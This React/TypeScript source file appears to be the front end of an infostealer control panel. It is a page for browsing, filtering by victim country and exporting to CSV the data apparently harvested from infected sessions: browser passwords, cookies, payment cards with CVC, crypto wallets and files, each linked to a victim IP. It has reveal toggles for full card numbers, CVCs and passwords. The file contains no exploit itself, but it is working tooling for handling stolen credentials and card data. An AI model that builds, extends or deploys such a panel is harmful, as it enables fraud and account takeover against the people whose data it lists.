import { useState, useMemo, useEffect, useCallback, type ReactNode } from 'react'
import { useNavigate } from 'react-router-dom'
import { useQuery, keepPreviousData } from '@tanstack/react-query'
import { useI18n, type TranslationKey } from '@/lib/i18n'
import { ChevronLeft, ChevronRight, Download, Eye, EyeOff, Search } from 'lucide-react'
import { api } from '@/lib/api'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import { Skeleton } from '@/components/ui/skeleton'
import { FlagIcon } from '@/components/charts/flag-icon'
import { COUNTRY_NAMES } from '@/lib/countries'

export type DataType = 'passwords' | 'cookies' | 'cards' | 'wallets' | 'files'

interface BaseDataItem {
  id: string
  session_id: string
  created_at?: string
  country_code?: string
  ip?: string
}
export interface PasswordItem extends BaseDataItem {
  url?: string
  username?: string
  password_value?: string
  browser?: string
}
export interface CookieItem extends BaseDataItem {
  domain?: string
  name?: string
  value?: string
  path?: string
}
export interface CardItem extends BaseDataItem {
  number?: string
  exp_month?: string
  exp_year?: string
  holder?: string
  cvc?: string
}
export interface WalletItem extends BaseDataItem {
  name?: string
  path?: string
}
export interface FileItem extends BaseDataItem {
  filename?: string
  size?: number
}

type DataItem = PasswordItem | CookieItem | CardItem | WalletItem | FileItem

interface DataPage {
  items: DataItem[]
  total: number
  page: number
  limit: number
  pages: number
}

const PAGE_SIZE = 50

function formatBytes(bytes?: number): string {
  if (!bytes || bytes === 0) return '0 B'
  const k = 1024
  const sizes = ['B', 'KB', 'MB', 'GB']
  const i = Math.floor(Math.log(bytes) / Math.log(k))
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(1))} ${sizes[i]}`
}

function formatDate(v?: string): string {
  if (!v) return '-'
  return new Date(v).toLocaleString(undefined, {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
  })
}

function csvEscape(v: unknown): string {
  const s = v == null ? '' : String(v)
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}

type TranslateFn = (key: TranslationKey, params?: Record<string, string | number>) => string

interface CellCtx {
  t: TranslateFn
  blurred: boolean
  revealed: Set<string>
  toggleReveal: (id: string) => void
  pageIndex: number
  pageSize: number
}

interface ColumnDef {
  id: string
  header: string
  className?: string
  sensitive?: boolean
  csv?: (row: DataItem) => unknown
  render: (row: DataItem, index: number, ctx: CellCtx) => ReactNode
}

const rowNumberCol = (): ColumnDef => ({
  id: 'row',
  header: '#',
  className: 'w-8 text-muted-foreground text-xs',
  render: (_row, index, ctx) => ctx.pageIndex * ctx.pageSize + index + 1,
})

const countryCol = (): ColumnDef => ({
  id: 'country',
  header: 'table.country',
  csv: row => (row as BaseDataItem).country_code ?? '',
  render: (row, _index) => {
    const code = (row as BaseDataItem).country_code ?? ''
    return (
      <div className="flex items-center gap-1.5">
        <FlagIcon country={code} />
        <span className="font-mono text-xs">{code}</span>
      </div>
    )
  },
})

const dateCol = (): ColumnDef => ({
  id: 'created_at',
  header: 'table.date',
  csv: row => (row as BaseDataItem).created_at ?? '',
  render: (row, _index) => (
    <span className="text-xs text-muted-foreground whitespace-nowrap">
      {formatDate((row as BaseDataItem).created_at)}
    </span>
  ),
})

const passwordCol = (): ColumnDef => ({
  id: 'password',
  header: 'table.password',
  sensitive: true,
  csv: row => (row as PasswordItem).password_value ?? '',
  render: (row, _index, ctx) => {
    const p = row as PasswordItem
    const show = ctx.revealed.has(p.id)
    return (
      <div className={`flex items-center gap-2 ${ctx.blurred ? 'blur-sm select-none' : ''}`}>
        <span className="font-mono">{show ? (p.password_value ?? '') : '••••••••'}</span>
        <button
          onClick={(e) => { e.stopPropagation(); ctx.toggleReveal(p.id) }}
          className="text-muted-foreground hover:text-foreground"
          aria-label={show ? 'Hide password' : 'Show password'}
        >
          {show ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
        </button>
      </div>
    )
  },
})

const cardNumberCol = (): ColumnDef => ({
  id: 'number',
  header: 'table.number',
  sensitive: true,
  csv: row => (row as CardItem).number ?? '',
  render: (row, _index, ctx) => {
    const c = row as CardItem
    const show = ctx.revealed.has(`card-${c.id}`)
    const masked = c.number ? `•••• •••• •••• ${c.number.slice(-4)}` : '-'
    return (
      <button
        onClick={(e) => { e.stopPropagation(); ctx.toggleReveal(`card-${c.id}`) }}
        className={`font-mono text-xs hover:text-foreground ${ctx.blurred ? 'blur-sm select-none' : ''}`}
        aria-label={show ? 'Hide card number' : 'Reveal card number'}
      >
        {show ? (c.number ?? '-') : masked}
      </button>
    )
  },
})

const cvcCol = (): ColumnDef => ({
  id: 'cvc',
  header: 'table.cvc',
  sensitive: true,
  csv: row => (row as CardItem).cvc ?? '',
  render: (row, _index, ctx) => {
    const c = row as CardItem
    if (!c.cvc) return '-'
    const show = ctx.revealed.has(`cvc-${c.id}`)
    return (
      <button
        onClick={(e) => { e.stopPropagation(); ctx.toggleReveal(`cvc-${c.id}`) }}
        className={`inline-flex items-center gap-1 font-mono text-xs hover:text-foreground ${ctx.blurred ? 'blur-sm select-none' : ''}`}
        aria-label={show ? 'Hide CVC' : 'Reveal CVC'}
      >
        {show ? c.cvc : '•••'}
        {show ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
      </button>
    )
  },
})

const textCol = (id: string, header: string, get: (row: DataItem) => unknown, className?: string): ColumnDef => ({
  id,
  header,
  className,
  csv: get,
  render: (row) => {
    const v = get(row)
    return <span className={className}>{v == null || v === '' ? '-' : String(v)}</span>
  },
})

const COLUMNS: Record<DataType, ColumnDef[]> = {
  passwords: [
    rowNumberCol(),
    textCol('url', 'table.url', row => (row as PasswordItem).url, 'max-w-xs truncate font-mono text-xs'),
    textCol('username', 'table.username', row => (row as PasswordItem).username, 'font-mono text-xs'),
    passwordCol(),
    textCol('browser', 'table.browser', row => (row as PasswordItem).browser, 'text-xs'),
    countryCol(),
    dateCol(),
  ],
  cookies: [
    rowNumberCol(),
    textCol('domain', 'table.domain', row => (row as CookieItem).domain, 'font-mono text-xs'),
    textCol('name', 'table.name', row => (row as CookieItem).name, 'font-mono text-xs max-w-[200px] truncate'),
    textCol('value', 'table.value', row => (row as CookieItem).value, 'font-mono text-xs max-w-[300px] truncate'),
    textCol('path', 'table.path', row => (row as CookieItem).path, 'font-mono text-xs'),
    countryCol(),
    dateCol(),
  ],
  cards: [
    rowNumberCol(),
    cardNumberCol(),
    textCol('expires', 'table.expires', row => {
      const c = row as CardItem
      return c.exp_month && c.exp_year ? `${c.exp_month}/${c.exp_year}` : ''
    }, 'text-xs'),
    textCol('holder', 'table.holder', row => (row as CardItem).holder, 'text-xs'),
    cvcCol(),
    countryCol(),
    dateCol(),
  ],
  wallets: [
    rowNumberCol(),
    textCol('name', 'table.name', row => (row as WalletItem).name, 'text-xs'),
    textCol('path', 'table.path', row => (row as WalletItem).path, 'font-mono text-xs'),
    countryCol(),
    dateCol(),
  ],
  files: [
    rowNumberCol(),
    textCol('filename', 'table.filename', row => (row as FileItem).filename, 'font-mono text-xs max-w-xs truncate'),
    {
      id: 'size',
      header: 'table.size',
      csv: row => (row as FileItem).size ?? 0,
      render: (row) => <span className="text-xs tabular-nums">{formatBytes((row as FileItem).size)}</span>,
    },
    countryCol(),
    dateCol(),
  ],
}

export default function DataTablePage({ type }: { type: DataType }) {
  const navigate = useNavigate()
  const { t } = useI18n()
  const [search, setSearch] = useState('')
  const [debouncedSearch, setDebouncedSearch] = useState('')
  const [country, setCountry] = useState('')
  const [page, setPage] = useState(1)
  const [blurred, setBlurred] = useState(false)
  const [revealed, setRevealed] = useState<Set<string>>(new Set())

  useEffect(() => {
    const timer = setTimeout(() => setDebouncedSearch(search), 300)
    return () => clearTimeout(timer)
  }, [search])

  useEffect(() => {
    setPage(1)
  }, [debouncedSearch, country, type])

  const toggleReveal = useCallback((id: string) => {
    setRevealed(prev => {
      const next = new Set(prev)
      if (next.has(id)) next.delete(id)
      else next.add(id)
      return next
    })
  }, [])

  const query = useQuery<DataPage>({
    queryKey: ['data', type, page, debouncedSearch, country],
    queryFn: () => api.get<DataPage>(`/api/data/${type}`, {
      page,
      limit: PAGE_SIZE,
      q: debouncedSearch || undefined,
      country: country || undefined,
    }),
    placeholderData: keepPreviousData,
  })

  const data = query.data
  const items = data?.items ?? []
  const columns = COLUMNS[type]
  const total = data?.total ?? 0

  const countryOptions = useMemo(() => [
    { value: '', label: t('sessions.all_countries') },
    ...Object.entries(COUNTRY_NAMES)
      .sort(([, a], [, b]) => a.localeCompare(b))
      .map(([code, name]) => ({ value: code, label: name })),
  ], [t])

  const ctx: CellCtx = { t, blurred, revealed, toggleReveal, pageIndex: page, pageSize: PAGE_SIZE }

  const exportCsv = () => {
    if (items.length === 0) return
    const cols = columns.filter(c => c.csv)
    const header = cols.map(c => csvEscape(t(c.header as TranslationKey))).join(',')
    const rows = items.map(item => cols.map(c => csvEscape(c.csv!(item))).join(','))
    const csv = [header, ...rows].join('\n')
    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' })
    const a = document.createElement('a')
    a.href = URL.createObjectURL(blob)
    a.download = `${type}-${new Date().toISOString().slice(0, 10)}.csv`
    a.click()
    URL.revokeObjectURL(a.href)
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between flex-wrap gap-2">
        <div className="flex items-center gap-3">
          <h1 className="text-2xl font-semibold tracking-tight">{t(`nav.${type}` as TranslationKey)}</h1>
          {data && (
            <span className="text-sm text-muted-foreground tabular-nums">
              {t('data.total', { count: total })}
            </span>
          )}
        </div>
        <div className="flex items-center gap-2">
          <div className="relative">
            <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
            <Input
              placeholder={t('data.search_placeholder')}
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="max-w-xs pl-8"
            />
          </div>
          <select
            value={country}
            onChange={(e) => setCountry(e.target.value)}
            className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
            aria-label={t('table.country')}
          >
            {countryOptions.map(opt => (
              <option key={opt.value} value={opt.value}>{opt.label}</option>
            ))}
          </select>
          <Button
            variant="outline"
            size="sm"
            onClick={() => setBlurred(!blurred)}
            aria-label={t('data.blur')}
            title={t('data.blur')}
            className={blurred ? 'bg-primary/10' : ''}
          >
            {blurred ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
          </Button>
          <Button variant="outline" size="sm" onClick={exportCsv} disabled={items.length === 0}>
            <Download className="h-4 w-4 mr-1" />
            {t('data.export')}
          </Button>
        </div>
      </div>

      {query.isLoading && !query.data ? (
        <Skeleton className="h-96" />
      ) : (
        <>
          <div className="rounded-md border">
            <Table>
              <TableHeader>
                <TableRow>
                  {columns.map(col => (
                    <TableHead key={col.id} className={col.id === 'row' ? 'w-8' : undefined}>
                      {col.header === '#' ? '#' : t(col.header as TranslationKey)}
                    </TableHead>
                  ))}
                </TableRow>
              </TableHeader>
              <TableBody>
                {items.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={columns.length} className="h-24 text-center text-muted-foreground">
                      {t('data.no_data')}
                    </TableCell>
                  </TableRow>
                ) : (
                  items.map((item, i) => (
                    <TableRow
                      key={item.id}
                      className="cursor-pointer"
                      onClick={() => navigate(`/sessions/${item.session_id}`)}
                    >
                      {columns.map(col => (
                        <TableCell key={col.id} className={col.className}>
                          {col.render(item, i, ctx)}
                        </TableCell>
                      ))}
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>

          <div className="flex items-center justify-between">
            <span className="text-sm text-muted-foreground tabular-nums">
              {data
                ? t('sessions.showing', { a: items.length, b: total.toLocaleString() })
                : t('common.loading')}
            </span>
            <div className="flex items-center gap-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setPage(p => Math.max(1, p - 1))}
                disabled={!data || page <= 1}
              >
                <ChevronLeft className="h-4 w-4" />
              </Button>
              <span className="text-sm tabular-nums">
                Page {data ? data.page : '?'} of {data ? data.pages : '?'}
              </span>
              <Button
                variant="outline"
                size="sm"
                onClick={() => setPage(p => p + 1)}
                disabled={!data || page >= (data?.pages ?? 1)}
              >
                <ChevronRight className="h-4 w-4" />
              </Button>
            </div>
          </div>
        </>
      )}
    </div>
  )
}
